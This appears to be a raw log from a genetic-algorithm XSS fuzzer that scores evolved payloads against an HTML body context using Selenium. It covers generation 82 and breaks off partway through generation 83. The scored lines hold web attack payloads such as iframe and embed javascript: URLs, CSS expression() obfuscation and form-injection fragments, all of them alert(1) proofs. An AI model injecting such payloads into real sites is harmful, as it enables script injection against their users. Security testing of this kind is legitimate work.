[92m1/1 Create individuals using Genetic Algorithm.[0m
[92m[+][0m Evaluating html place : body_tag
[92m[+][0m Create population.
[94m[*][0m Create individual : [195, 49, 110, 173, 11]. 
[92m[+][0m 81 generation result: Min=-0.9, Max=2.6, Avg=0.09100000000000007.
[92m[+][0m Evaluate individual : 82/10000 generation.
[94m[*][0m Evaluation individual in body_tag: 1/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 2/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 3/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 4/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 5/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 6/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 7/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 8/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 9/100 in 82 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 10/100 in 82 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 11/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 12/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 13/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 14/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 15/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 16/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 17/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 18/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 19/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 20/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 21/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 22/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 23/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 24/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 25/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 26/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 27/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 28/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 29/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 30/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 31/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 32/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 33/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 34/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 35/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 36/100 in 82 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.3
[94m[*][0m Evaluation individual in body_tag: 37/100 in 82 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 38/100 in 82 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 39/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 40/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 41/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 42/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 43/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 44/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 45/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 46/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 47/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 48/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 49/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 50/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 51/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 52/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 53/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 54/100 in 82 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.3
[94m[*][0m Evaluation individual in body_tag: 55/100 in 82 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 56/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 57/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 58/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 59/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 60/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 61/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 62/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 63/100 in 82 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"</embed>VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"</embed>VBS:Msgbox+1'> ([179, 190, 37, 260, 77])", Score=2.6
[94m[*][0m Evaluation individual in body_tag: 64/100 in 82 generation
[94m[*][0m Selenium score : "<embed src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<embed src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([156, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 65/100 in 82 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 66/100 in 82 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 67/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 68/100 in 82 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.6
[94m[*][0m Evaluation individual in body_tag: 69/100 in 82 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 70/100 in 82 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 71/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 72/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 73/100 in 82 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 74/100 in 82 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 75/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 76/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 77/100 in 82 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.1
[94m[*][0m Evaluation individual in body_tag: 78/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 79/100 in 82 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 80/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 81/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 82/100 in 82 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 83/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 84/100 in 82 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.6
[94m[*][0m Evaluation individual in body_tag: 85/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 86/100 in 82 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 87/100 in 82 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 88/100 in 82 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 89/100 in 82 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 90/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 91/100 in 82 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 92/100 in 82 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 93/100 in 82 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 94/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 95/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 96/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 97/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 98/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 99/100 in 82 generation
[94m[*][0m Evaluation individual in body_tag: 100/100 in 82 generation
[92m[+][0m 82 generation result: Min=-1.4000000000000001, Max=2.6, Avg=0.23299999999999998.
[92m[+][0m Evaluate individual : 83/10000 generation.
[94m[*][0m Evaluation individual in body_tag: 1/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 2/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 3/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 4/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 5/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 6/100 in 83 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 7/100 in 83 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 8/100 in 83 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 9/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 10/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 11/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 12/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 13/100 in 83 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 14/100 in 83 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 15/100 in 83 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 16/100 in 83 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 17/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 18/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 19/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 20/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 21/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 22/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 23/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 24/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 25/100 in 83 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 26/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 27/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 28/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 29/100 in 83 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=1.9
[94m[*][0m Evaluation individual in body_tag: 30/100 in 83 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 31/100 in 83 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 32/100 in 83 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 33/100 in 83 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 34/100 in 83 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 35/100 in 83 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 36/100 in 83 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 37/100 in 83 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 38/100 in 83 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"</embed>VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"</embed>VBS:Msgbox+1'> ([179, 190, 37, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 39/100 in 83 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 40/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 41/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 42/100 in 83 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 43/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 44/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 45/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 46/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 47/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 48/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 49/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 50/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 51/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 52/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 53/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 54/100 in 83 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 55/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 56/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 57/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 58/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 59/100 in 83 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=1.9
[94m[*][0m Evaluation individual in body_tag: 60/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 61/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 62/100 in 83 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 63/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 64/100 in 83 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 65/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 66/100 in 83 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 67/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 68/100 in 83 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"<object xss:expressio&#x5c;6e(alert(1))'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"<object xss:expressio&#x5c;6e(alert(1))'> ([179, 190, 26, 280, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 69/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 70/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 71/100 in 83 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 72/100 in 83 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 73/100 in 83 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 74/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 75/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 76/100 in 83 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"<video><source call.call(<button form=x>XSS</button><form id=x action=" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"<video><source call.call(<button form=x>XSS</button><form id=x action= ([179, 190, 2, 140, 134])", Score=2.1
[94m[*][0m Evaluation individual in body_tag: 77/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 78/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 79/100 in 83 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 80/100 in 83 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"src=saivs.js VBS:Msgbox+1'> ([179, 190, 42, 260, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 81/100 in 83 generation
[94m[*][0m Evaluation individual in body_tag: 82/100 in 83 generation
